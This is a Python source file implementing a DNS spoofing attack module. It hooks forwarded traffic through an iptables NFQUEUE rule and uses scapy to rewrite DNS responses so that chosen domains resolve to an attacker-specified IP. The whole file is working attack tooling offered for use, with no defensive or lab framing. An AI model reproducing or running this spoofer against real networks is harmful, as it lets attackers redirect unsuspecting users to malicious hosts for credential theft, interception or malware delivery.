#!/usr/bin/env python3
"""
DNS Spoofing Attack Module
Implements DNS spoofing attack, resolving domain names to attacker-specified IPs
"""

import netfilterqueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Raw
import threading

class DNSSpoofer:
    def __init__(self, spoof_domains=None, redirect_ip=None):
        """
        Initialize DNS spoofer
        
        Args:
            spoof_domains: List of domain names to spoof
            redirect_ip: IP address to redirect to
        """
        self.spoof_domains = spoof_domains or []
        self.redirect_ip = redirect_ip or "192.168.1.100"
        self.spoofing = False
        self.queue = None
        self.queue_num = 0
    
    def process_packet(self, packet):
        """Process packet"""
        try:
            scapy_packet = IP(packet.get_payload())
            
            if scapy_packet.haslayer(DNSQR):
                qname = scapy_packet[DNSQR].qname.decode('utf-8').rstrip('.')
                
                # Check if this domain name needs to be spoofed
                if any(domain in qname for domain in self.spoof_domains):
                    print(f"[+] DNS spoofing: {qname} -> {self.redirect_ip}")
                    
                    # Modify DNS response
                    answer = DNSRR(rrname=qname, rdata=self.redirect_ip)
                    scapy_packet[DNS].an = answer
                    scapy_packet[DNS].ancount = 1
                    
                    # Delete checksum and length fields, let system recalculate
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
            
            packet.accept()
        except Exception as e:
            print(f"Error processing packet: {e}")
            packet.accept()
    
    def start(self, queue_num=0):
        """
        Start DNS spoofing
        
        Args:
            queue_num: netfilterqueue queue number
        """
        if self.spoofing:
            return False
        
        try:
            self.queue_num = queue_num
            self.queue = netfilterqueue.NetfilterQueue()
            self.queue.bind(queue_num, self.process_packet)
            self.spoofing = True
            
            # Set up iptables rules
            import subprocess
            subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(queue_num)], check=True)
            
            print(f"[+] DNS spoofing started (queue: {queue_num})")
            print(f"[+] Spoofing domains: {', '.join(self.spoof_domains)}")
            print(f"[+] Redirecting to: {self.redirect_ip}")
            
            # Run queue in background thread
            queue_thread = threading.Thread(target=self.queue.run, daemon=True)
            queue_thread.start()
            
            return True
        except Exception as e:
            print(f"Error starting DNS spoofing: {e}")
            print("Hint: Root privileges required, and netfilterqueue must be installed")
            return False
    
    def stop(self):
        """Stop DNS spoofing"""
        if not self.spoofing:
            return False
        
        try:
            self.spoofing = False
            if self.queue:
                self.queue.unbind()
            
            # Delete iptables rules
            import subprocess
            subprocess.run(['iptables', '-D', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(self.queue_num)], check=False)
            
            print("[+] DNS spoofing stopped")
            return True
        except Exception as e:
            print(f"Error stopping DNS spoofing: {e}")
            return False


